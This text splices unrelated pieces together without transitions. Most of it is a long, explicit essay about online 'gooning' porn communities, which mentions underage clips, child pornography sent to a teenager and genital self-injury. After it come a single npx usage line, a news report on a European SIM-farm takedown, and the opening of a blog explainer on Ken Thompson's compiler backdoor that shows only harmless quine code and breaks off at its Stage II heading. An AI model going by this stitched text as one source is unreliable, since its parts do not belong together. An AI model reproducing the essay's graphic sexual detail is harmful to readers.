    &lt;p&gt;I was struck by the, let’s say, complex sexual valence of wankbattling and feeding in the context of a culture centered on heterosexual pornography. (There is, it should be said, a separate, equally vibrant, and by all accounts far less psychosexually muddled world of gay-porn gooning.) Fuji, from what I can tell, is representative here: someone who identifies as heterosexual and claims to find gay porn “disgusting,” but in whom gooning has unlocked a limited, primarily virtual strain of bi-curiosity, one that manifests in his case as a desire to “dominate” other men in porn-based online trading games.&lt;/p&gt;
    &lt;p&gt;This is not to erase the many pure bisexuals in the community, nor the unambiguous straights, nor the self-described femboys, nor the trans women of every sexual orientation. Squint very hard—to the point of risking permanent eye damage—and you can almost see in Goonworld the realization of the Nineties dream of the internet as an incorporeal, judgment-free, gender-fluid sexual playground. But I suspect what these gooners might really be after is—as one Questionnaire respondent put it—“the sense of community” that these spaces offer, this being “something [the] modern world has become increasingly deprived of.”&lt;/p&gt;
    &lt;p&gt;What you hardly need an amateur goonthropologist to tell you—and what the Questionnaire amply bears out—is that this phenomenon in its full sweep can be traced at least partially to the fact that, in the span of about five years earlier this century, virtually every child in the developed world was granted instant, unrestricted access not merely to hardcore pornography but to some of the most extreme examples of it ever produced in human history. Many respondents have been regular porn viewers since the fourth grade; few were older than twelve when they picked up the habit. And they were watching some serious stuff. Stuff that, in earlier eras, you’d need to go out of your way to find—stuff that you could only get your hands on with the help of a middleman.&lt;/p&gt;
    &lt;p&gt;On a near-daily basis over the past decade, opinion columnists have fretted over this state of affairs, primarily over how all of this porn—a fair share of it violent and explicitly misogynist—was affecting the sexual behavior of young men in real life. What they apparently hadn’t considered was that the porn alone might be enough, that at sufficient speed and in sufficient quantity it could function as a workable substitute for life itself. This was certainly true for some before the pandemic, but the lockdowns appear to have disastrously accelerated this particular outcome in younger members of Gen Z. I’d been surprised at first to find that out of 107 respondents, 47 claimed to be sexually active in some capacity—roughly 47 more than I’d expected. But a quick crunch of the numbers set things straight. Median age of the sexually active gooner: twenty-seven. Median age of the non–sexually active gooner: twenty-three—i.e., someone in high school or college when the lockdowns began. It was this latter group that, in the Questionnaire, was likeliest to identify not merely as a gooner but also as a “pornosexual.”&lt;/p&gt;
    &lt;p&gt;You can think of the pornosexual as a species of voluntary celibate, or “volcel.” Like a volcel, the pornosexual chooses not to have sex. Unlike a volcel, the pornosexual does so because their sexual needs are entirely met by pornography, which not a few of them conceive as a kind of “entity” or “goddess” requiring absolute and daily-enacted fealty.&lt;/p&gt;
    &lt;p&gt;A twenty-eight-year-old pornosexual living in Los Angeles who goes by Spishak is not quite that far gone. I’d found him on Reddit, where his gooncave caught my eye: I counted twenty-seven separate pornographic videos playing simultaneously in the image he’d posted, accompanied by detailed technical specs—eight tablets, three twenty-seven-inch monitors—for other at-home tinkerers. (Unfortunately for Spishak, he has to reassemble this setup every time he gets the urge and disassemble it directly afterward, at least until he moves out of his parents’ home.)&lt;/p&gt;
    &lt;p&gt;Before Spishak joined the gooning community and began identifying as a pornosexual, he was simply a virgin, a fact he did not find particularly erotic, unlike some other Questionnaire respondents. By his own admission, Spishak has never been “good with talking to women”—“I just don’t know how to read signs: blah, blah”—and by the time his junior year in college rolled around, there were no women around to talk to anyway: the pandemic was in full swing. Struggling through online classes in his childhood bedroom, he needed an outlet.&lt;/p&gt;
    &lt;p&gt;Spishak gave me a few stated reasons for his pornosexuality. One is a fear of STDs; another is standard-issue performance anxiety. These both make a degree of sense: gooning compilations can’t give you chlamydia; a zip file can’t impugn your virility. But what a zip file also can’t do is lie to you—and it is this element of Spishak’s pornosexual philosophy that seems to me most striking, and most emblematic of the Gen Z gooner mindset writ large. It turns out that what most frightens Spishak about sex is the impossibility of ever knowing what’s really going on in your partner’s (or anyone else’s) head. What if she’s bored by what Spishak’s doing but too polite to tell him? Worse: What if she’s uncomfortable with the entire situation? How could Spishak possibly know? “I just feel like it’s exhausting,” he says. “For both parties.”&lt;/p&gt;
    &lt;p&gt;In a best-case scenario, a pornosexual like Spishak would get a girlfriend and spend the rest of his life fighting gooncave flashbacks at doctor’s appointments and children’s piano recitals. Maybe he can change his name or something. Until then, there is porn’s unconditional embrace. But as the Questionnaire made clear, the porn that many of these gooners are watching bears little resemblance to the form as it’s conventionally understood. Reared on the tube sites, where a user might skim ten or more clips in the course of a given session, they have grown accustomed to a degree of stimulation that most porn isn’t equipped to satisfy. Hence their adoption of a new form, one that enshrines this rapid-fire mode of porn consumption as a compositional principle: the “porn music video,” or PMV.&lt;/p&gt;
    &lt;p&gt;The PMV is freebase pornography—porn purified of anything that might disrupt its swift passage to the brain. These are schizophrenic porn mosaics of often staggering density: hundreds of clips sourced from existing online porn and spliced into productions of just a few minutes’ length, soundtracked by the kind of ludicrous, pounding techno more often associated with unlicensed weed stores. Some contain seizure warnings. Others contain prompts to inhale poppers, and for how long. Many appear beamed in from some future Gooner Republic, a screen-enclosed world of rigorous illiteracy in which all human exchanges, from restaurant orders to marriage proposals, take the form of elaborate pornographic-GIF trading. And the gooners love them. They can’t get enough of them. What’s the appeal? Per the Questionnaire:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;It’s overstimulation at it’s best.&lt;/p&gt;
      &lt;p&gt;It means i don’t have to scroll as much and get more porn in my brain&lt;/p&gt;
      &lt;p&gt;Think of how TikTok is so engaging because it’s an endless stream of variety and stimulation and “brain rot” so to speak. People can’t stop watching TikToks. The PMVs I tend to enjoy are like porn and TikTok doing a fusion dance.&lt;/p&gt;
      &lt;p&gt;The fast pictures, [the] movements of the girls make you crazy to goon even more!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;If you find yourself watching dozens upon dozens of PMVs for putatively professional purposes, you will come to notice that, much of the time, the sucking and/or thrusting in each clip is synced to the beat. That was NoodleDude’s innovation. NoodleDude is a twenty-eight-year-old Dutch web designer whose roughly thrice-yearly video drops are received with Swiftie-like enthusiasm among the terminal-porn-addict cognoscenti. After a sputtering start with “Don’t Stop: A Post Orgasm/Cum Again PMV,” he took the scene by storm with “I Fuck with E-Girls: A TikTok PMV.” Today there is hardly a video on PMVHaven.com that doesn’t ape his signature effects.&lt;/p&gt;
    &lt;p&gt;The e-girl thing is important. Many of the ostensible porn fans who responded to the Questionnaire claimed not even to know the names of any actual porn stars. They are far more interested in e-girls, a nebulous category that in Goonworld refers primarily to women who dabble in gamer-girl aesthetics—neon hair, cat ears, spandex Spider-Man costumes—and who, more often than not, sell adult content on OnlyFans. The sheer quantity of material generated by the OnlyFans revolution in porn is staggering. Compare the thirteen thousand films released by the professional porn industry in 2005 to the 4.6 million registered OnlyFans creators last year and you start to understand the bind today’s diligent porn addict finds himself in: there is simply too much to masturbate to. PMVs, which blend the best of this material into supercharged, rhythmic highlight reels, are a logical response to the glut.&lt;/p&gt;
    &lt;p&gt;NoodleDude, talking to me from his home in Amsterdam, was humble about his achievements. It is the contention of NoodleDude and other PMV artists I spoke with that their craft is not unlike that of early hip-hop artists, twisting existing material into novel shapes. Aware that he and his peers are profiting off others’ labor—and spooked as well by some angry emails and a few threats of legal action—NoodleDude has recently begun to credit each woman who appears in his videos, and has used his outsized influence over the board of the World PMV Games to insist on mandating the same from entrants. (He has also formed a corps of volunteer NoodleDude fanatics to comb through clips he’s thinking of using to verify that the women they feature are not underage; a few have slipped through in the past, which, per NoodleDude, “is not a very good situation to be in.”)&lt;/p&gt;
    &lt;p&gt;Not long after we first spoke, I had occasion to witness one of NoodleDude’s productions in the wild. It was the kind of January afternoon that makes life seem completely pointless, just one miserable thing after another, and I was on the seventh floor of a hotel room in Jersey City, watching a fiftysomething man known as WristbandGuy energetically lay the groundwork for a communal, in-the-flesh porn-watching party—the thirty-fifth installment of a series called Real Porn Meets. WristbandGuy was hunched over one of his three porn-filled laptops, wrestling with the hotel’s Wi-Fi, when a NoodleDude clip flashed on the screen.&lt;/p&gt;
    &lt;p&gt;“NoodleDude!” I said. “I know that guy!” The excitement I heard in my own voice chilled me to the bone. WristbandGuy paused his efforts and turned in my direction.&lt;/p&gt;
    &lt;p&gt;“He’s an artist,” he said, with reverence.&lt;/p&gt;
    &lt;p&gt;Nothing about WristbandGuy’s appearance shouts “raging pornography fiend.” Nothing about WristbandGuy shouts at all. He’s low-key, an IT worker who maintains a winningly self-deprecating attitude toward his passion project: “It’s like, ‘What’s your hobby?’ ‘Oh, well, every couple months I get twenty guys in a hotel room to watch porn.’” As it happened, he was at that very moment streaming a curated porn playlist to the Discord server Porn Streaming Hub (thirty-five thousand members at last count), a form of passive promotion for Real Porn Meets, which he founded in 2019 and was itself inspired by Discord’s then-emergent stream-room jack-off culture. (As WristbandGuy describes his thinking at the time: “This is great—but we should be in a living room, instead of online.”) One hundred and twenty gooners had RSVP’d to that evening’s event, which, from WristbandGuy’s experience, meant that about fifteen would ultimately show.&lt;/p&gt;
    &lt;p&gt;I’d first heard of the Jersey City event from a pornosexual who went by Whiteboy Jacker. Jacker was an interesting case, one of Goonworld’s truly lost souls; he’d spent part of our call trying to explain the appeal of damaging your penis badly enough to permanently prevent getting an erection, but not so badly as to prevent masturbating for hours on end. I don’t know whether Jacker eventually showed up; WristbandGuy had barred me from sticking around for the main event, a decision I was not particularly inclined to challenge. But our conversation had tanked my mood for days, and the PMVs I was at that point watching continuously were only making things worse. By the time I’d arrived in Jersey City, I despaired of finding even the slightest redemptive glimmer in all of Goonworld.&lt;/p&gt;
    &lt;p&gt;WristbandGuy, for his part, was an amiable if preoccupied host. With great efficiency he arranged the lube station, propped a Fleshlight hole-down on the kitchen counter (“It doesn’t get much use, but it’s there to be shared”), and taped full-color printouts of gooncaps to the walls. I mentioned to him that these memes seemed markedly cheerier than the ones I’d come across online, which tended toward nihilism (pump until your mind is broken, and so on). Most of WristbandGuy’s, by contrast, were cheeky encomiums to the pleasures of jacking off with your friends.&lt;/p&gt;
    &lt;p&gt;These gooncaps, I discovered, were a key part of the “hidden agenda” underpinning his parties. As a veteran of kink culture, WristbandGuy puts a premium on comfort, self-care, and consent. The actual wristbands he distributes at his gatherings attest to this: As WristbandGuy explains it, not every guy who shows up to a porn-watching party does so with a definite mind toward getting jacked off, jacking someone else off, etc. The wristbands allow attendees to efficiently broadcast their comfort levels—green for “all-in,” yellow for “curious,” and red for “not interested.” But it goes deeper than that. WristbandGuy, it turns out, has zero tolerance for those Gen Z-ers who flaunt their degradation, who “brag about going multiple days, or not eating, or skipping work or school.” He told me, “If someone says, ‘Oh, I’ve gone for six hours straight,’ when everyone else is saying congratulations, I’m saying, ‘Hey—are you staying hydrated? Are you taking meal breaks? Maybe you need to get some sleep.’” The goal, said WristbandGuy, is to foster the conditions for “a long, healthy goon life.”&lt;/p&gt;
    &lt;p&gt;I saluted WristbandGuy’s efforts while suspecting they were futile—roughly equivalent to trying to stave off a tornado by double-locking the front door. Healthy gooning, as any gooner can tell you, is an oxymoron. In this world, I was coming to learn, the degradation is the point.&lt;/p&gt;
    &lt;p&gt;If there is any coherent message to the sprawling folk-art practices of Goonworld, it is this: kill yourself. Not literally, but spiritually. Where mainstream porn invites the straight-male viewer to imagine himself as the man onscreen, gooner porn constantly reminds viewers that they are alone, that they are masturbating to porn because no one would ever deign to sleep with them. “Ruin your mind,” “go deeper,” “give up on life”: these are goon porn’s basic slogans, the movement’s rallying cries. Even NoodleDude—as tame a practitioner as one can find in this space, and whose productions a non-gooner might conceivably find, if not arousing, at least not actively terrifying—has adopted this attitude. In the introduction to his recent video “Follow Me,” a woman’s voice whispers ominously, or perhaps sexily, that “over two hundred ten million people worldwide are addicted to social media. You are one of those people. Keep scrolling. Further. Deeper. Forever. And ever. Submit. To porn. You can’t. Turn back.”&lt;/p&gt;
    &lt;p&gt;I’m not trying to spoil anyone’s fun. And I’m aware that the desire to be erotically humiliated has been hardwired into certain psyches since the dawn of time. But it seems to me troubling that so very many people are discovering in themselves an appetite for this particular strain of virtual degradation. No less an eminence than Angela White—the biggest mainstream porn star of her generation, oft referred to in the tabloids as the “Meryl Streep of porn”—is now actively courting the community, releasing gooner-targeted videos and giving shout-outs to “my gooners” during media appearances. (White to the Australian podcast I’ve Got News for You in 2022: “They’ll edge for days, weeks, months without completion. And they just obsess over me and I really enjoy making content for them, because they get so excited about it. They’re a lot of fun.”) This isn’t healthful in-person power play, which demands from its participants certain sensitivities, or at least the social acumen to leave one’s home and look another person in the eye. No: this a bunch of guys sitting alone in their rooms being viciously abused by their computers, sinking deeper into the despair that compelled them to seek out that abuse in the first place. Even the people who make this content are starting to feel slightly weird about the whole arrangement.&lt;/p&gt;
    &lt;p&gt;My conversation with the porn producer who runs HumiliationPOV, the studio behind such recent titles as Little Dick Losers Deserve Loneliness, Isolation, and Endless Gooning, was particularly illuminating on this front—so illuminating, in fact, that I’m just going to quote the producer’s remarks as a lightly compressed and edited monologue:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;People really get into the darkness of the fetish. It’s not just the addiction—the guys enjoy the humiliation of being humiliated for their addiction while they’re participating in it. And it hits some very real places in a guy’s head. When I started out sixteen years ago, it was nothing like it is today. Numbers-wise, I can tell you as someone in the business, it’s grown exponentially.&lt;/p&gt;
      &lt;p&gt;Gooning kind of automatically took off. I don’t know where it came from, but everyone loves it. We use the word as much as possible. We talk about it as much as possible. There’s a large amount of guys who come home from work every night and put these types of videos on and masturbate for hours, and it’s become their sex life. In my clips, we humiliate them for the fact that gooning to femdom videos is their sex life now. We encourage them not to have sex anymore, and to spend the rest of their life spending money on femdom clips.&lt;/p&gt;
      &lt;p&gt;You know, it’s a little fucked up, I’m going to admit. It’s almost like a drug, and we’re almost, like, pushing that drug on addicts. And honestly, I question the ethics of it sometimes. [Laughs.] We’re pushing people who are forgoing personal relationships because they’re so lost in their gooning addictions. And encouraging that only drives them deeper. So, do I ever have questions of morality about that in my own mind? Yeah, I do. But has it stopped me? [Laughs.] No. I enjoy my job. I like what I do.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The producer’s words were still echoing in my mind a few weeks later when I spoke to a nineteen-year-old gooner called JustDamage. By that point, I was not only weary of Goonworld, but jaded: What was this gooner going to tell me that I didn’t already know? What large-scale scientific gooning surveys had he orchestrated lately? And indeed, the basic outline of the gooning journey that JustDamage walked me through was a familiar one: he hears the term around; stumbles into a Discord server; reorients his life around prolonged quasi-mystical masturbation; starts a side hustle in customized gooncaps and PMVs. His customers may or may not know he’s a teenager, but some would likely be pleased to learn it. When one person sent him child porn to stitch into a PMV, he decided to retire. These days, JustDamage is “still gooning avidly,” mostly to porn edited with voice-overs insisting that you should not be watching the porn you’re trying to watch. What’s new, I thought. Sweet kid, I thought. Universal conscription, I thought. Reeducation camps. We’ll make them fun for the gooners, they won’t have to suffer. I was preparing to wind things down, to thank the gooner for his time, when he began to tell me a story.&lt;/p&gt;
    &lt;p&gt;JustDamage, it seems, once had a friend. Or maybe “friend” isn’t the word. JustDamage knew another kid on Discord with whom he’d occasionally trade pornographic GIFs and images. For large swaths of Gen Z, it’s possible that this simply is friendship. This gooner was also nineteen and was fairly new to the scene—he’d joined the community just a few months earlier—but had taken to it passionately, so passionately that JustDamage was concerned for his welfare. His room was “littered with trash.” The bed was littered with trash; the floor was littered with trash. The floor was also stained with piss (“every time he needed to go to the bathroom, if it was peeing, he’d just stand up”), and the walls were stained with cum. He painted his windows to keep the light out; he didn’t want to know the time of day. “I think he had over fifty sex toys: butt plugs, dildos, personal masturbators,” JustDamage told me. “None of them was ever cleaned.” Eventually, JustDamage had to stop talking to him. He didn’t know whether he was still in the community; he hadn’t seen him around since.&lt;/p&gt;
    &lt;p&gt;By this point, I almost prided myself on my unflappability, but the story of JustDamage’s friend, by far the most gruesome I’d heard, touched a nerve. I wanted to find him—I needed to know how his story had turned out. Over and over again, I gave out his description to my network of gooners: nineteen, blacked-out windows, piss and trash on the floor, etc. The gooners racked their brains. They got thoughtful. Pissing on the floor, sure, one had seen that. But blacked-out windows? This wasn’t ringing a bell. I searched for every permutation of what JustDamage remembered as the friend’s username—PornosexualGooner101—but this was like going door to door looking for a guy named Sal on Staten Island.&lt;/p&gt;
    &lt;p&gt;To preemptively deflate the narrative: I never did find him. But I will say also that when I pictured him—the young man for whom all of this was real, who either missed the joke or understood that there had never been one—I’d see him always with limpid blue eyes, in a gown, with a shaved head, adjusting to the pills and reflecting, with stunned acceptance, on his ill-fated tenure in Goonworld. He would open up in group counseling sessions and organize movie nights for the other patients and see occasionally, in his mind’s periphery, the looming friend request of another would-be feeder, battler, jerk bud. And he would resist it.&lt;/p&gt;
    &lt;p&gt;That is to say: on some level I always imagined I’d find him better. As opposed to—as is more likely the case—much, much worse.&lt;/p&gt;
    &lt;p&gt;In my first conversation with Gooncultist, he described the goonstate in near-religious terms. “It’s one of those things where it only works if you believe that it could work,” he said. “Which makes it a real pain in the ass to reason about.” Did I believe in the goonstate? Months into my time in Goonworld, this came to seem like an urgent question, unanswerable by conventional journalistic means. If the goonstate were a collective fiction—if the gooners were lying about its existence, to me or to themselves—this would have to bear on my conception of them, would it not? How could I presume to cast judgment without trying to reach the goonstate myself? Plus, I’m only human, only so capable of absorbing the blows of any given day without occasionally yearning for a temporary off switch. The idea of dissolving the self in an acid bath of erotic imagery was not, in the end, so unappealing.&lt;/p&gt;
    &lt;p&gt;As a kind of warm-up, I decided on a bit of wankbattling. FeedBitch was by far the more courteous of my two eventual opponents, dismissing my opening volley—an image of the porn star Annabel Redd I’d sourced from the GoonVerse—with a sweet (if gently condescending) “not my taste qt.” Cumdumpster, by contrast, was brusque, peremptory, and stingy with his scores, as if I’d been put on earth to curate pornography for him. Of course, all of this was just so much procrastination in the face of my actual task, which awaited me in the GoonVerse’s stream room.&lt;/p&gt;
    &lt;p&gt;Looking back now, there are things I could’ve done to make my time in that stream room more successful. I could’ve purchased one of the many complicated male masturbation toys the gooners had drawn my attention to. I could’ve spent my years of peak brain development romping around a toxic-waste site, slurping sludge and indiscriminately licking circuit boards. As things stand, I can say only that it wasn’t for me. If there is a goonstate, I failed even to reach its threshold, stalling instead at states better known to me—the state of despair, the state of panic, the state of paralyzed awe at the onrushing future. I sat alone in a room with a laptop, watching myself watch other guys watch porn, wondering what the world will look like when I am old.&lt;/p&gt;
    &lt;p&gt;Even this late in the game, I struggled to understand how anyone could find any of this pleasurable, let alone addictive. But then, by the gooners’ own private admission—despite their constant protests to the contrary on their preferred Discord servers—most of them are not actually addicted to porn. (In fact, the research is far from settled on whether “porn addiction,” in a clinical sense, exists in the first place.) Certainly, they like porn a whole lot. Certainly, they are aroused by the concept of being ruinously in its thrall. Certainly, many of them are using porn to cope with some fairly serious life problems. But what your average gooner is up to is basically a kind of sad, confusing role-play. Like those lunatic trolls who emerge now and then to threaten the children of right-wing media targets, the gooners are just having fun, playing around, saying the things one says to get ahead in their particular community. Most of the gooners I spoke with had no interest in completely surrendering their lives to porn, and many looked askance at the truly devoted, ruin-your-mind pornosexual contingent. Those gooners, the other gooners insisted, are crazy: they give gooners a bad name.&lt;/p&gt;
    &lt;p&gt;But I can’t get entirely behind the few-bad-apples theory. Nor can I so neatly separate the gooners as a whole from the rest of us. Think about it for a second: What are these gooners actually doing? Wasting hours each day consuming short-form video content. Chasing intensities of sensation across platforms. Parasocially fixating on microcelebrities who want their money. Broadcasting their love for those microcelebrities in public forums. Conducting bizarre self-experiments because someone on the internet told them to. In general, abjuring connective, other-directed pleasures for the comfort of staring at screens alone. Does any of this sound familiar? Do you maybe know some folks who get up to stuff like this? It’s true that gooners are masturbating while they engage in these behaviors. You could say that only makes them more honest.&lt;/p&gt;
    &lt;p&gt;Granted, day-in-the-life TikToks or unboxing videos won’t poison your soul to precisely the same degree as gooner porn. But it’s hard not to see goonerism as just an intensification, almost a burlesque, of prevailing cultural trends. Pornosexuals are clearly not the only people out there in the process of retreating from life. It’s probably more useful to think of a company like Aylo—the owner of Pornhub and most of the other major tube sites, as well as most of the name-brand porn studios—as just another large tech-entertainment giant, like Meta, Netflix, or FanDuel. From these companies’ perspective, the ideal consumer would do literally nothing but goon, lose at gambling, and maybe watch other people play video games. You can try to fight this. You can read a book, pet a dog, buy a stupid box to lock away your phone. You can make a joke about the box, about the absurdity of your need for it. What do these companies care? They’ve won. If they have their way—and they usually do—in time we will all be gooners, of a kind.&lt;/p&gt;
    &lt;p&gt;This isn’t to suggest that we aren’t enthusiastic collaborators in the progressive annihilation of our brains. Nor is it to suggest that, absent attention-shattering social platforms, we’d use the internet solely to keep up with friends and engage in improving hobbies. Peering into Goonworld’s darkest corners has convinced me that what we are dealing with here may well be a structural flaw of networked communication itself. Is there a timeline, a regulatory environment, in which the internet does not turn into a highly efficient manufacturer of niche suicide cults? I find it hard to imagine. In the case of the gooners, one can hope—and in more cheerful moments, I do think it’s possible—that sustained overexposure to porn will dampen the medium’s effectiveness as a numbing agent. That at a certain point, the gooner will open his eyes, find himself in a room filled with lube but void of love, and decide that the boredom of staying in that room outweighs the fear of whatever lies beyond it.&lt;/p&gt;

    &lt;p&gt;There are several ways to use &lt;code&gt;fta&lt;/code&gt;. The simplest is to use &lt;code&gt;fta-cli&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;npx fta-cli path/to/project&lt;/code&gt;

    &lt;p&gt;European police forces have arrested seven people and dismantled a large-scale cybercrime-as-a-service operation that saw almost 50 million fake online accounts created across social media and communications platforms for fraud purposes.&lt;/p&gt;
    &lt;p&gt;The coordinated takedown, codenamed Operation SIMCARTEL, took place on October 10 in Latvia, as part of a joint investigation by police in the Baltic nation, Austria, Estonia and Finland.&lt;/p&gt;
    &lt;p&gt;Five Latvian nationals and two additional suspects were arrrested by police.&lt;/p&gt;
    &lt;p&gt;In the raid, authorities seized 1200 SIM boxes, with the devices containing 40,000 active SIM cards.&lt;/p&gt;
    &lt;p&gt;Five Internet servers were taken down, along with two websites that had been offering the illegal service, gogetsms.com and apisim.com.&lt;/p&gt;
    &lt;p&gt;The network operated as a for-hire service, providing temporary telephone numbers from more than 80 countries to criminals who needed to mask their identities whilst committing cybercrimes.&lt;/p&gt;
    &lt;p&gt;Fraudsters used the service to bypass two-factor authentication systems so as to create vast numbers of fake accounts.&lt;/p&gt;
    &lt;p&gt;Once created, the bogus accounts served as starting points for various scams including investment fraud, fake online shops, and phishing attacks.&lt;/p&gt;
    &lt;p&gt;The infrastructure facilitated a range of offences including fraud, extortion, migrant smuggling and the distribution of child sexual abuse material.&lt;/p&gt;
    &lt;p&gt;Scammers employed tactics including the "daughter-son scam", where criminals persuaded victims that their child needed urgent financial help, alongside more traditional phishing and smishing attacks.&lt;/p&gt;
    &lt;p&gt;Some of the criminals specialised in fraud on second-hand marketplaces, whilst others set up fake investment websites and bogus online shops.&lt;/p&gt;
    &lt;p&gt;In other cases, criminals impersonated police officers using forged identification, personally collecting funds from victims.&lt;/p&gt;
    &lt;p&gt;Financial losses in Austria alone are said to be to around €4.5 million ($7.4 million), with an additional €420,000 ($693,000) lost in Latvia.&lt;/p&gt;
    &lt;p&gt;Around €431,000 ($711,000) was seized from the criminals' bank accounts, along with approximately $516,000 worth of crypto currency.&lt;/p&gt;
    &lt;p&gt;Police investigators working with Europol and Eurojust, attributed over 1700 individual cyber fraud cases in Austria and 1500 in Latvia to the criminal network.&lt;/p&gt;
    &lt;p&gt;Europol provided analytical support, open-source intelligence analysis for mapping the online criminal service, and forensic expertise to secure digital evidence.&lt;/p&gt;
    &lt;p&gt;The agency worked with the not-for-profit Shadowserver Foundation security organisation to dismantle the technical infrastructure.&lt;/p&gt;
    &lt;p&gt;In September this year, United States law enforcement busted another "SIM farm", with 300 devices and with over 100,000 subscriber identity cards found on the site near the United Nations headquarters in New York City.&lt;/p&gt;
    &lt;p&gt;The US Secret Service was involved in the raid in New York, and suspected nation-state threat actors were operating the SIM farm.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;When Ken Thompson won the Turing Award jointly with Dennis Ritchie for their work in UNIX, he was expected like other Turing winners to write a paper that would be published in the ACM Computer Journal. What he ended up submitting was a paper about "the cutest program [he] ever wrote"-- a sneaky undetectable self-reproducing "Trojan horse" backdoor in the C compiler that would allow him to log into affected machines as any user.&lt;/p&gt;
    &lt;head class="toc-title"&gt;Table of Contents&lt;/head&gt;
    &lt;head rend="h2"&gt;Overview&lt;/head&gt;
    &lt;p&gt;Thompson didn't want to write about the usual things that Turing award winners write about— in fact, according to him,1 he didn't want to write a paper at all. However, when he did finally write a paper (after putting it off for a year past the original deadline, see ~2:52:49 in the above video), he describes at a high level how the C compiler (itself a program written in C) parses and compiles C source code into machine code to set the stage for how the "Trojan horse" would be injected into the generated machine code while leaving the original input C source code seemingly unmodified.&lt;/p&gt;
    &lt;p&gt;He explains that while in college at UC Berkeley, him and colleagues would "[amuse themselves] by posing programming exercises," one of which was "to write the shortest self-reproducing program":&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;More precisely stated, the problem is to write a source program that, when compiled and executed, will produce as output an exact copy of its source ... The part about "shortest" was just an incentive to demonstrate skill and determine a winner.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;The Trojan Horse&lt;/head&gt;
    &lt;p&gt;In this section, I'll try to illustrate the "Trojan horse" originally presented by Thompson through a combination of the original quasi-C pseudocode and the source code and examples from Russ Cox's article on this subject, where Cox got Thompson to actually send him the source code after seeing a talk Thompson gave in 2023.2&lt;/p&gt;
    &lt;head rend="h3"&gt;Stage I: Self-Reproducing Programs&lt;/head&gt;
    &lt;p&gt;In this stage, Thompson describes a self-reproducing program (also known as a "quine"3). The key insight is that a program can contain its own source code as data, which it then prints along with the code to print it.&lt;/p&gt;
    &lt;p&gt;Here's Thompson's example from the paper:&lt;/p&gt;
    &lt;code&gt;/* Figure 1 */
char s[] = {
  '\t',
  '0',
  '\n',
  // (213 lines deleted)
  0
};

/*
  * The string s is a
  * representation of the body
  * of this program from `0`
  * to the end.
*/

main()
{
  int i;

  printf("char\ts[ ] = {\n");
  for (i = 0; s[i]; i++) {
    printf("\t%d,\n", s[i]);
  }
  printf("%s", s);
}
&lt;/code&gt;
    &lt;p&gt;There are two critical properties here to make note of for later:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;"This program can easily be written by another program."&lt;/item&gt;
      &lt;item&gt;"This program can contain an arbitrary amount of excess baggage that will be reproduced along with the main algorithm."&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Here are some simple transliterations to allow a non-C programmer to read this code:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Operator&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;=&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;assignment&lt;/cell&gt;

        &lt;cell&gt;single character constant&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;"xxx"&lt;/cell&gt;
        &lt;cell&gt;multiple character string&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;%d&lt;/cell&gt;
        &lt;cell&gt;format to convert to decimal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;%s&lt;/cell&gt;
        &lt;cell&gt;format to convert to string&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\t&lt;/cell&gt;
        &lt;cell&gt;tab character&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\n&lt;/cell&gt;
        &lt;cell&gt;newline character&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Here's a classic Python quine to demonstrate the self-reproducing behavior:&lt;/p&gt;
    &lt;code&gt;s = 's = %r\nprint(s %% s)'
print(s % s)
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;s&lt;/code&gt; holds a string that is almost the whole program, including the placeholder
&lt;code&gt;%r&lt;/code&gt;, which formats via &lt;code&gt;repr()&lt;/code&gt;. The &lt;code&gt;print(s % s)&lt;/code&gt; uses Python's old C-style
&lt;code&gt;%&lt;/code&gt;-formatting.&lt;/p&gt;
    &lt;p&gt;Important notes about the characters inside &lt;code&gt;s&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;%r&lt;/code&gt;is a placeholder: it tells Python to insert the&lt;code&gt;repr()&lt;/code&gt;of the argument doing the&lt;code&gt;%&lt;/code&gt;-formatting.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;\n&lt;/code&gt;is the newline character to separate the two source lines produced in the output.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;%%&lt;/code&gt;is to be able to include a literal&lt;code&gt;%&lt;/code&gt;in a string that will be used with&lt;code&gt;%&lt;/code&gt;-formatting; after formatting it becomes a single&lt;code&gt;%&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The &lt;code&gt;%r&lt;/code&gt; inside the string is replaced by the Python string representation of
&lt;code&gt;s&lt;/code&gt; itself, so the program prints the text of &lt;code&gt;s = ...&lt;/code&gt; followed by the &lt;code&gt;print&lt;/code&gt;
line. The &lt;code&gt;%r&lt;/code&gt; is the key as it auto-escapes and auto-quotes the representation
so the printed string is a valid piece of Python code. Here's the result of
running the program:&lt;/p&gt;
    &lt;code&gt;Python 3.13.2 (main, Feb 26 2025, 14:47:35) [Clang 16.0.0 (clang-1600.0.26.6)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
&amp;gt;&amp;gt;&amp;gt; s = 's = %r\nprint(s %% s)'
... print(s % s)
...
s = 's = %r\nprint(s %% s)'
print(s % s)
&lt;/code&gt;
    &lt;head rend="h3"&gt;Stage II: Compilers "Learn"&lt;/head&gt;
